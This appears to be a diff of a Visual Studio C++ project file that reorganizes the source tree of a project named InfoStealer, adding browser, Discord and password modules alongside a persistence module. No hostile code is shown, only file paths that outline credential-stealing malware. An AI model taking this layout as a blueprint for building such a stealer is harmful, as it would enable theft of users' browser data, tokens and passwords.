@@ -127,14 +127,20 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
-    <ClCompile Include="InfoStealer.cpp" />
-    <ClCompile Include="initialize.cpp" />
-    <ClCompile Include="persistance.cpp" />
+    <ClCompile Include="src\InfoStealer.cpp" />
+    <ClCompile Include="src\modules\browser\browser.cpp" />
+    <ClCompile Include="src\modules\discord\discord.cpp" />
+    <ClCompile Include="src\modules\initialize.cpp" />
+    <ClCompile Include="src\modules\passwords\passwords.cpp" />
+    <ClCompile Include="src\persistance\persistance.cpp" />
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="errorMessages.hpp" />
-    <ClInclude Include="initialize.hpp" />
-    <ClInclude Include="persistance.hpp" />
+    <ClInclude Include="include\errorMessages.hpp" />
+    <ClInclude Include="include\modules\browser\browser.hpp" />
+    <ClInclude Include="include\modules\discord\discord.hpp" />
+    <ClInclude Include="include\modules\initialize.hpp" />
+    <ClInclude Include="include\modules\passwords\passwords.hpp" />
+    <ClInclude Include="include\persistance\persistance.hpp" />
   </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
